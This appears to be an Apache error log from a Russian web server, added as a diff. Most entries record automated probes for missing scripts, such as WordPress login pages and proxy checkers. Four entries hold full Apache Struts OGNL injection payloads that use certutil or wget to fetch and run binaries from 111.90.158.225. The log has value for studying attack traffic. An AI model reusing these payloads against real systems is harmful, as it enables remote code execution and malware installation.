@@ -1,0 +1,767 @@
+[Tue Nov 06 21:54:02.143083 2018] [php7:error] [pid 18647] [client 176.120.25.160:44878] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Wed Nov 07 16:46:39.396120 2018] [php7:error] [pid 22656] [client 102.165.51.161:4833] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109:8080/
+[Wed Nov 07 16:46:43.137060 2018] [php7:error] [pid 24698] [client 127.0.0.1:43852] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109/
+[Thu Nov 08 14:24:09.937208 2018] [php7:error] [pid 28424] [client 127.0.0.1:59552] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109/
+[Thu Nov 08 14:24:13.988481 2018] [php7:error] [pid 29693] [client 77.121.70.13:55077] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109:8080/
+[Tue Nov 13 18:40:39.150716 2018] [php7:error] [pid 29670] [client 194.50.51.62:61224] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109:8080/
+[Tue Nov 13 18:40:47.315050 2018] [php7:error] [pid 29673] [client 127.0.0.1:34072] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109/
+[Fri Nov 16 18:15:24.597325 2018] [php7:error] [pid 19472] [client 83.217.8.122:37317] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Sat Nov 17 07:15:12.748125 2018] [php7:error] [pid 27084] [client 5.188.210.12:48794] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Sun Nov 18 06:38:02.798992 2018] [php7:error] [pid 4570] [client 5.188.210.12:48136] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Mon Nov 19 02:54:23.377450 2018] [core:error] [pid 4575] (36)File name too long: [client 54.37.196.121:58688] AH00036: access to /${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#w=#ct.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('certutil.exe -urlcache -split -f http://111.90.158.225/d/fast.exe c:/fast.exe&cmd.exe /c c:\\\\fast.exe').getInputStream()))).(#w.close())}/index.action failed (filesystem path '/var/www/banks.obzorzarplat.ru/docs/public/${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#w=#ct.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('certutil.exe -urlcache -split -f http:')
+[Mon Nov 19 02:54:23.474188 2018] [core:error] [pid 4567] (36)File name too long: [client 54.37.196.121:58874] AH00036: access to /${(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('certutil.exe -urlcache -split -f http://111.90.158.225/d/fast.exe c:/fast.exe&cmd.exe /c c:\\\\fast.exe').getInputStream()))).(#w.close())}/index.action failed (filesystem path '/var/www/banks.obzorzarplat.ru/docs/public/${(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('certutil.exe -urlcache -split -f http:')
+[Mon Nov 19 02:54:23.567696 2018] [core:error] [pid 4569] (36)File name too long: [client 54.37.196.121:59050] AH00036: access to /${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#w=#ct.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('uname --m|grep x86_64 >> /dev/null || (pkill loop ; wget -O .loop http://111.90.158.225/d/ft32 && chmod 777 .loop && ./.loop)&&(pkill loop ; wget -O .loop http://111.90.158.225/d/ft64 && chmod 777 .loop && ./.loop)').getInputStream()))).(#w.close())}/index.action failed (filesystem path '/var/www/banks.obzorzarplat.ru/docs/public/${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#w=#ct.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('uname --m|grep x86_64 >> ')
+[Mon Nov 19 02:54:23.659301 2018] [core:error] [pid 4701] (36)File name too long: [client 54.37.196.121:59228] AH00036: access to /${(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('uname --m|grep x86_64 >> /dev/null || (pkill loop ; wget -O .loop http://111.90.158.225/d/ft32 && chmod 777 .loop && ./.loop)&&(pkill loop ; wget -O .loop http://111.90.158.225/d/ft64 && chmod 777 .loop && ./.loop)').getInputStream()))).(#w.close())}/index.action failed (filesystem path '/var/www/banks.obzorzarplat.ru/docs/public/${(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('uname --m|grep x86_64 >> ')
+[Tue Nov 20 00:39:22.446044 2018] [php7:error] [pid 20330] [client 127.0.0.1:53614] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat, referer: http://www.google.com.hk
+[Tue Nov 20 00:39:38.702107 2018] [php7:error] [pid 19085] [client 127.0.0.1:53626] script '/var/www/banks.obzorzarplat.ru/docs/public/xmlrpc.php' not found or unable to stat, referer: http://www.google.com.hk
+[Fri Nov 23 00:54:45.180142 2018] [php7:error] [pid 18070] [client 185.24.93.74:54607] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Sun Nov 25 05:10:13.293987 2018] [php7:error] [pid 4601] [client 216.244.86.250:63092] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109:8080/
+[Wed Nov 28 19:21:10.183990 2018] [php7:error] [pid 13131] [client 5.188.210.12:44805] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Sat Dec 01 22:28:36.155681 2018] [php7:error] [pid 12427] [client 127.0.0.1:38782] script '/var/www/banks.obzorzarplat.ru/docs/public/login.php' not found or unable to stat
+[Sat Dec 01 22:28:52.230628 2018] [php7:error] [pid 12427] [client 127.0.0.1:39004] script '/var/www/banks.obzorzarplat.ru/docs/public/4da706bc9b578057.php' not found or unable to stat
+[Sat Dec 01 22:28:52.378252 2018] [php7:error] [pid 12533] [client 127.0.0.1:39006] script '/var/www/banks.obzorzarplat.ru/docs/public/ae3a060de64f38fc.php' not found or unable to stat
+[Sat Dec 01 22:29:56.131897 2018] [autoindex:error] [pid 19552] [client 127.0.0.1:39840] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.php,index.html,index.shtml,index.htm) found, and server-generated directory index forbidden by Options directive
+[Sun Dec 02 02:49:46.739803 2018] [php7:error] [pid 12430] [client 205.209.174.80:52136] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109:8080/
+[Sun Dec 02 18:29:55.373462 2018] [php7:error] [pid 25233] [client 127.0.0.1:57236] script '/var/www/banks.obzorzarplat.ru/docs/public/login.php' not found or unable to stat
+[Sun Dec 02 18:30:12.059184 2018] [php7:error] [pid 25365] [client 127.0.0.1:57458] script '/var/www/banks.obzorzarplat.ru/docs/public/65eb4615aabef21a.php' not found or unable to stat
+[Sun Dec 02 18:30:12.212533 2018] [php7:error] [pid 25236] [client 127.0.0.1:57460] script '/var/www/banks.obzorzarplat.ru/docs/public/2ea07d2387fd90e5.php' not found or unable to stat
+[Sun Dec 02 18:31:18.194044 2018] [autoindex:error] [pid 25235] [client 127.0.0.1:58286] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.php,index.html,index.shtml,index.htm) found, and server-generated directory index forbidden by Options directive
+[Mon Dec 03 05:35:22.396350 2018] [php7:error] [pid 25233] [client 5.188.210.12:51064] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Tue Dec 04 11:08:23.315970 2018] [php7:error] [pid 20460] [client 83.217.8.122:33428] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Sat Dec 08 06:49:02.940940 2018] [php7:error] [pid 24415] [client 83.217.8.122:50261] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Sun Dec 09 15:03:32.741491 2018] [php7:error] [pid 989] [client 127.0.0.1:51760] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat
+[Mon Dec 10 03:48:37.221055 2018] [php7:error] [pid 361] [client 127.0.0.1:58716] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Mon Dec 10 11:42:15.642704 2018] [php7:error] [pid 13158] [client 127.0.0.1:41442] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat, referer: http://www.google.com.hk
+[Mon Dec 10 11:42:16.641181 2018] [php7:error] [pid 13159] [client 127.0.0.1:41444] script '/var/www/banks.obzorzarplat.ru/docs/public/xmlrpc.php' not found or unable to stat, referer: http://www.google.com.hk
+[Tue Dec 11 16:41:59.253370 2018] [php7:error] [pid 25664] [client 127.0.0.1:37420] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Wed Dec 12 03:21:15.759527 2018] [php7:error] [pid 25668] [client 5.188.210.12:20434] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Sun Dec 16 13:51:11.302073 2018] [php7:error] [pid 474] [client 194.147.32.109:45236] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Mon Dec 17 22:59:29.776276 2018] [php7:error] [pid 8479] [client 127.0.0.1:52230] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Tue Dec 18 05:27:49.617614 2018] [php7:error] [pid 8475] [client 217.106.238.30:47276] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Tue Dec 18 11:49:57.799982 2018] [php7:error] [pid 16495] [client 127.0.0.1:36730] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat, referer: http://www.google.com.hk
+[Tue Dec 18 11:50:18.859773 2018] [php7:error] [pid 16423] [client 127.0.0.1:36744] script '/var/www/banks.obzorzarplat.ru/docs/public/xmlrpc.php' not found or unable to stat, referer: http://www.google.com.hk
+[Tue Dec 18 11:50:36.176723 2018] [php7:error] [pid 16495] [client 127.0.0.1:36750] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat, referer: http://www.google.com.hk
+[Tue Dec 18 11:54:43.680709 2018] [php7:error] [pid 16422] [client 127.0.0.1:36804] script '/var/www/banks.obzorzarplat.ru/docs/public/xmlrpc.php' not found or unable to stat, referer: http://www.google.com.hk
+[Tue Dec 18 22:35:29.453373 2018] [php7:error] [pid 16495] [client 127.0.0.1:47160] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Wed Dec 19 03:00:03.494797 2018] [php7:error] [pid 16426] [client 127.0.0.1:48964] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Wed Dec 19 20:37:10.092077 2018] [php7:error] [pid 25127] [client 127.0.0.1:38924] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Thu Dec 20 08:12:33.774059 2018] [php7:error] [pid 32178] [client 127.0.0.1:48036] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Thu Dec 20 12:51:57.429523 2018] [php7:error] [pid 32172] [client 127.0.0.1:54020] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Sat Dec 22 05:11:34.506283 2018] [php7:error] [pid 7725] [client 5.188.210.12:27284] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Sat Dec 22 14:27:04.308321 2018] [php7:error] [pid 20589] [client 127.0.0.1:37118] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Mon Dec 24 12:27:43.548421 2018] [php7:error] [pid 8820] [client 176.120.25.160:52472] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Thu Dec 27 07:21:48.043708 2018] [php7:error] [pid 29689] [client 204.16.194.75:51858] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109:8080/
+[Thu Dec 27 23:29:50.315304 2018] [php7:error] [pid 29693] [client 127.0.0.1:53900] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Sat Dec 29 14:03:30.140484 2018] [php7:error] [pid 11259] [client 94.177.170.32:57832] script '/var/www/banks.obzorzarplat.ru/docs/public/azenv.php' not found or unable to stat
+[Wed Jan 02 05:04:03.750667 2019] [php7:error] [pid 782] [client 176.120.25.160:59800] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Sat Jan 05 04:53:36.500825 2019] [php7:error] [pid 23495] [client 5.188.210.50:37628] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Mon Jan 07 00:12:23.147556 2019] [php7:error] [pid 8421] [client 127.0.0.1:47634] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Mon Jan 07 05:06:41.436576 2019] [php7:error] [pid 8430] [client 127.0.0.1:49700] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Mon Jan 07 10:51:23.185842 2019] [php7:error] [pid 14732] [client 5.188.210.50:60811] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Mon Jan 07 13:16:36.786153 2019] [php7:error] [pid 15061] [client 95.213.187.186:61097] script '/var/www/banks.obzorzarplat.ru/docs/public/azenv.php' not found or unable to stat, referer: https://best-proxies.ru/
+[Tue Jan 08 06:41:45.731270 2019] [php7:error] [pid 23092] [client 127.0.0.1:33930] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat
+[Tue Jan 08 13:07:11.723528 2019] [php7:error] [pid 23085] [client 127.0.0.1:41412] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat, referer: http://www.google.com.hk
+[Tue Jan 08 13:07:15.786257 2019] [php7:error] [pid 23088] [client 127.0.0.1:41414] script '/var/www/banks.obzorzarplat.ru/docs/public/xmlrpc.php' not found or unable to stat, referer: http://www.google.com.hk
+[Fri Jan 11 14:27:03.548025 2019] [php7:error] [pid 27649] [client 127.0.0.1:46342] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat, referer: http://www.google.com.hk
+[Fri Jan 11 14:27:41.156439 2019] [php7:error] [pid 28173] [client 127.0.0.1:46356] script '/var/www/banks.obzorzarplat.ru/docs/public/xmlrpc.php' not found or unable to stat, referer: http://www.google.com.hk
+[Fri Jan 11 16:53:09.311090 2019] [php7:error] [pid 28173] [client 127.0.0.1:49418] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Sun Jan 13 01:22:15.575275 2019] [php7:error] [pid 8854] [client 83.217.8.122:34019] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Mon Jan 14 07:03:25.709446 2019] [php7:error] [pid 28945] [client 5.188.210.50:39379] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Mon Jan 14 22:50:15.468115 2019] [php7:error] [pid 28946] [client 84.50.67.53:58454] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109:8080/
+[Fri Jan 18 02:47:02.931872 2019] [php7:error] [pid 7479] [client 142.93.7.89:37758] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat
+[Tue Jan 22 13:05:20.824146 2019] [php7:error] [pid 29975] [client 176.120.25.160:40014] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Thu Jan 24 12:29:40.113492 2019] [php7:error] [pid 23823] [client 5.188.210.12:33589] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Fri Jan 25 00:08:00.214241 2019] [php7:error] [pid 23822] [client 95.213.187.190:55964] script '/var/www/banks.obzorzarplat.ru/docs/public/azenv_bp.php' not found or unable to stat, referer: https://best-proxies.ru/
+[Fri Jan 25 08:20:14.147705 2019] [php7:error] [pid 5057] [client 127.0.0.1:50352] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Fri Jan 25 20:29:22.036298 2019] [php7:error] [pid 5055] [client 127.0.0.1:58596] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat, referer: http://www.google.com.hk
+[Fri Jan 25 20:29:33.943304 2019] [php7:error] [pid 5056] [client 127.0.0.1:58598] script '/var/www/banks.obzorzarplat.ru/docs/public/xmlrpc.php' not found or unable to stat, referer: http://www.google.com.hk
+[Sat Jan 26 00:39:00.388043 2019] [php7:error] [pid 5684] [client 120.21.203.108:3230] script '/var/www/banks.obzorzarplat.ru/docs/public/reply.php' not found or unable to stat
+[Sat Jan 26 00:39:00.428133 2019] [php7:error] [pid 5055] [client 120.21.203.108:3242] script '/var/www/banks.obzorzarplat.ru/docs/public/reply.php' not found or unable to stat
+[Sat Jan 26 13:15:44.248844 2019] [php7:error] [pid 20716] [client 83.217.8.122:37754] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Sat Jan 26 14:44:22.701574 2019] [php7:error] [pid 16383] [client 5.178.86.76:32743] script '/var/www/banks.obzorzarplat.ru/docs/public/azenv_bp.php' not found or unable to stat, referer: https://best-proxies.ru/
+[Sat Jan 26 15:37:29.818481 2019] [php7:error] [pid 16389] [client 5.188.210.12:13143] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Sun Jan 27 19:15:43.655834 2019] [php7:error] [pid 26788] [client 109.104.220.185:20256] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109:8080/
+[Fri Feb 01 08:29:54.785301 2019] [php7:error] [pid 31180] [client 212.237.1.209:35764] script '/var/www/banks.obzorzarplat.ru/docs/public/setup.php' not found or unable to stat
+[Mon Feb 04 01:56:17.512641 2019] [php7:error] [pid 25201] [client 202.161.112.254:52576] script '/var/www/banks.obzorzarplat.ru/docs/public/reply.php' not found or unable to stat
+[Mon Feb 04 01:56:17.544643 2019] [php7:error] [pid 25198] [client 202.161.112.254:53075] script '/var/www/banks.obzorzarplat.ru/docs/public/reply.php' not found or unable to stat
+[Mon Feb 04 01:56:17.865588 2019] [php7:error] [pid 25198] [client 202.161.112.254:8491] script '/var/www/banks.obzorzarplat.ru/docs/public/reply.php' not found or unable to stat
+[Mon Feb 04 06:08:17.049061 2019] [php7:error] [pid 25203] [client 5.188.210.12:53006] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Sun Feb 10 20:14:06.168514 2019] [php7:error] [pid 27036] [client 127.0.0.1:35906] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat, referer: http://www.google.com.hk
+[Sun Feb 10 20:14:19.370827 2019] [php7:error] [pid 27038] [client 127.0.0.1:35908] script '/var/www/banks.obzorzarplat.ru/docs/public/xmlrpc.php' not found or unable to stat, referer: http://www.google.com.hk
+[Mon Feb 11 00:35:19.740832 2019] [php7:error] [pid 27038] [client 149.129.50.37:50080] script '/var/www/banks.obzorzarplat.ru/docs/public/proxyjudge.php' not found or unable to stat
+[Mon Feb 11 09:20:47.606277 2019] [php7:error] [pid 18762] [client 194.147.32.109:32800] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Mon Feb 11 09:29:36.474870 2019] [php7:error] [pid 21542] [client 127.0.0.1:43866] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Tue Feb 12 23:14:08.310960 2019] [php7:error] [pid 1596] [client 83.217.8.122:36759] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Thu Feb 14 10:39:22.176437 2019] [php7:error] [pid 7033] [client 176.32.33.80:44714] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Thu Feb 14 10:43:05.147984 2019] [php7:error] [pid 7034] [client 127.0.0.1:56968] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Sun Feb 17 01:10:46.481604 2019] [php7:error] [pid 27219] [client 162.251.151.68:40709] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sun Feb 17 10:11:42.075311 2019] [php7:error] [pid 29992] [client 5.188.210.12:54203] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Mon Feb 18 15:55:32.945345 2019] [php7:error] [pid 13088] [client 103.8.142.108:64018] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Tue Feb 19 07:29:43.393744 2019] [php7:error] [pid 28846] [client 127.0.0.1:35058] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat
+[Tue Feb 19 12:16:02.994724 2019] [php7:error] [pid 28848] [client 173.13.81.213:56642] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Wed Feb 20 17:30:55.790426 2019] [php7:error] [pid 7193] [client 217.106.238.30:55788] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Thu Feb 21 08:48:34.500969 2019] [php7:error] [pid 22452] [client 202.142.179.146:51745] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Thu Feb 21 19:43:41.619587 2019] [php7:error] [pid 22454] [client 34.76.144.62:58450] script '/var/www/banks.obzorzarplat.ru/docs/public/pgrade_handle.php' not found or unable to stat
+[Fri Feb 22 18:49:38.310983 2019] [php7:error] [pid 2117] [client 127.0.0.1:43110] script '/var/www/banks.obzorzarplat.ru/docs/public/xmlrpc.php' not found or unable to stat
+[Sun Feb 24 17:07:17.390544 2019] [php7:error] [pid 23362] [client 34.76.5.23:46886] script '/var/www/banks.obzorzarplat.ru/docs/public/upgrade_handle.php' not found or unable to stat
+[Mon Feb 25 09:42:45.710189 2019] [php7:error] [pid 3034] [client 83.217.8.122:46675] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Tue Feb 26 11:19:24.183498 2019] [php7:error] [pid 16797] [client 5.188.210.12:35775] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Wed Feb 27 18:42:53.952211 2019] [php7:error] [pid 1549] [client 34.76.232.87:53478] script '/var/www/banks.obzorzarplat.ru/docs/public/handle_load_config.php' not found or unable to stat
+[Fri Mar 01 13:27:17.493423 2019] [php7:error] [pid 20751] [client 127.0.0.1:56904] script '/var/www/banks.obzorzarplat.ru/docs/public/login.php' not found or unable to stat
+[Fri Mar 01 13:27:34.328746 2019] [php7:error] [pid 20621] [client 127.0.0.1:57128] script '/var/www/banks.obzorzarplat.ru/docs/public/9c26a6417e8f9705.php' not found or unable to stat
+[Fri Mar 01 13:27:34.480197 2019] [php7:error] [pid 20624] [client 127.0.0.1:57130] script '/var/www/banks.obzorzarplat.ru/docs/public/43448bded63e5d44.php' not found or unable to stat
+[Fri Mar 01 13:28:35.951591 2019] [autoindex:error] [pid 20624] [client 127.0.0.1:57964] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.php,index.html,index.shtml,index.htm) found, and server-generated directory index forbidden by Options directive
+[Fri Mar 01 13:28:40.928011 2019] [autoindex:error] [pid 20623] [client 127.0.0.1:58030] AH01276: Cannot serve directory /usr/share/javascript/: No matching DirectoryIndex (index.php,index.html,index.shtml,index.htm) found, and server-generated directory index forbidden by Options directive
+[Sat Mar 02 00:36:34.152750 2019] [php7:error] [pid 20751] [client 106.14.139.8:48562] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sat Mar 02 14:47:57.196140 2019] [php7:error] [pid 30592] [client 127.0.0.1:48052] script '/var/www/banks.obzorzarplat.ru/docs/public/login.php' not found or unable to stat
+[Sat Mar 02 14:48:13.422444 2019] [php7:error] [pid 30496] [client 127.0.0.1:48268] script '/var/www/banks.obzorzarplat.ru/docs/public/4bb6a6d1a3a7d3b2.php' not found or unable to stat
+[Sat Mar 02 14:48:13.569820 2019] [php7:error] [pid 30498] [client 127.0.0.1:48270] script '/var/www/banks.obzorzarplat.ru/docs/public/50ad989f29dded0d.php' not found or unable to stat
+[Sat Mar 02 14:49:15.697661 2019] [autoindex:error] [pid 30499] [client 127.0.0.1:49096] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.php,index.html,index.shtml,index.htm) found, and server-generated directory index forbidden by Options directive
+[Sat Mar 02 14:49:20.595438 2019] [autoindex:error] [pid 30499] [client 127.0.0.1:49168] AH01276: Cannot serve directory /usr/share/javascript/: No matching DirectoryIndex (index.php,index.html,index.shtml,index.htm) found, and server-generated directory index forbidden by Options directive
+[Sun Mar 03 03:49:24.019568 2019] [php7:error] [pid 30499] [client 127.0.0.1:55670] script '/var/www/banks.obzorzarplat.ru/docs/public/xmlrpc.php' not found or unable to stat, referer: http://www.google.com.hk
+[Mon Mar 04 07:50:22.954894 2019] [php7:error] [pid 15102] [client 47.97.103.141:50680] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sat Mar 09 14:13:18.323168 2019] [php7:error] [pid 9058] [client 83.217.8.122:48881] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Wed Mar 13 09:24:20.274372 2019] [php7:error] [pid 17518] [client 149.129.50.37:47706] script '/var/www/banks.obzorzarplat.ru/docs/public/proxyjudge.php' not found or unable to stat
+[Wed Mar 20 02:23:06.199969 2019] [php7:error] [pid 8558] [client 212.47.231.207:34414] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat
+[Thu Mar 21 10:01:20.961848 2019] [php7:error] [pid 31645] [client 185.24.93.74:51883] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Sun Mar 24 07:09:24.344746 2019] [php7:error] [pid 15090] [client 212.47.231.207:41173] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat
+[Fri Mar 29 02:07:39.652689 2019] [php7:error] [pid 25318] [client 114.115.146.56:35830] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sat Mar 30 03:37:05.801496 2019] [php7:error] [pid 6080] [client 176.32.33.145:57226] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Sat Mar 30 03:38:59.504764 2019] [php7:error] [pid 6081] [client 127.0.0.1:45554] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
